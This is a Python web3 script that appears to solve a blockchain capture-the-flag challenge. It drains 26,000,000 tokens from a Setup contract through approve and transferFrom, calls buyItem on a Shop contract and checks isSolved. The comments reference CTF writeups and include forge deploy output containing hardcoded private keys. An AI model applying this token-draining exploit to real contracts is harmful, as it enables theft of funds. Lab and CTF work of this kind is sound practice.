from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files
from Crypto.Util.number import bytes_to_long

x = {
    "PrivateKey": "0x3f634dab2f7c090bf64cb7117935ff88ae6c44fbc035b07ae86d4be2e0be0483",
    "Address": "0x2d33136fDAD7675E58331f31570f1bF0850AAfd2",
    "TargetAddress": "0x8f5459322De05399a43600a35b1967621ABd1249",
    "setupAddress": "0x772141E204660A20845478Fb85eC6809Adbc372f"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

Target2Contract = "0x52407e7C2B378cF51FFE63d0BD2dd060f33230E0"
Target3Contract = "0xE5cdce3D62618aB54a70a8123da9cBE3D66FeAa3"

url = 'http://157.245.37.125:32740/rpc'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)
block = w3.eth.get_block(1)

#print(block)

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

install_solc("0.7.0")


'''
# Check if the block exists
if block is not None:
    # Access block information
    block_hash = block['hash']
    block_timestamp = block['timestamp']
    block_transactions = block['transactions']

    print(f"Block Number: {block_number}")
    print(f"Block Hash: {block_hash}")
    print(f"Block Timestamp: {block_timestamp}")
    print(f"Block Transactions: {block_transactions}")

    # Retrieve and print transaction details for each transaction in the block
    for tx_hash in block_transactions:
        tx = w3.eth.get_transaction_receipt(tx_hash)
        if tx is not None:
            print(tx)

else:
    print(f"Block {block_number} not found.")
'''

compiled = compile_files(["SilverCoin.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['SilverCoin.sol:SilverCoin']['abi']

contract_instance3 = w3.eth.contract(address=Target3Contract, abi=abi)

contract_instance3.functions.approve(SetupContract, 28_000_000).transact()
contract_instance3.functions.transferFrom(SetupContract, Address, 26_000_000).transact()
'''
construct_txn = contract_instance3.functions.transfer(Address, 26_000_000).build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		#'from': Target2Address,
		#'nonce': w3.eth.get_transaction_count(Target2Address),
		'chainId': w3.eth.chain_id,
		#'value' : 1
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
	}
)

tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
'''

number = contract_instance3.functions.balanceOf(Address).call()
print(f'Balance of {Target3Contract}: {number}.')
number = contract_instance3.functions.balanceOf(SetupContract).call()
print(f'Balance of {SetupContract}: {number}.')

'''
compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['Contract.sol:Contract']['abi']

contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)

#contract_instance2.functions.attack2().transact()
print(contract_instance2.functions.balanceOf(Address).transact())
#print(contract_instance2.functions.balanceOf(TargetContract).call())
#print(contract_instance2.functions.balanceOf(SetupContract).call())
'''

compiled = compile_files(["Shop.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['Shop.sol:Shop']['abi']

contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)

construct_txn = contract_instance2.functions.buyItem(2).transact()
'''
construct_txn = contract_instance2.functions.buyItem(2).build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                #'from': Target2Address,
                #'nonce': w3.eth.get_transaction_count(Target2Address),
                'chainId': w3.eth.chain_id,
                #'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
'''

compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['Setup.sol:Setup']['abi']

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved(account_address).call()

print(f'The current number stored is: { number } ')
#


'''
https://ctftime.org/writeup/31583
https://0xsage.medium.com/ethernaut-lvl-4-walkthrough-how-to-abuse-tx-origin-msg-sender-ef37d6751c8

forge init . --no-git

forge create src/Contract.sol:Contract --rpc-url http://209.97.176.174:31323/rpc --private-key 0x643f9dae7f3636d00fddb4236351c6136001b2cb5641b49ea1f72c327e5f1981
[⠰] Compiling...
[⠔] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 40.18ms
Compiler run successful!
Deployer: 0xd44C694e6280032dA55cEF6715aA3d89c1AD4836
Deployed to: 0x855ad55752bCE030B8D8875d671494eE3F51B1e7
Transaction hash: 0xfcbc1aca59dc9b42ce5c917c38d28b7ba60488ab115b25aa9c425ac6513709e0


Change the address in Contract.sol, align with TargetAddress in rpc url
Change the address in dec.py, align with the new deplyed address by forge

'''
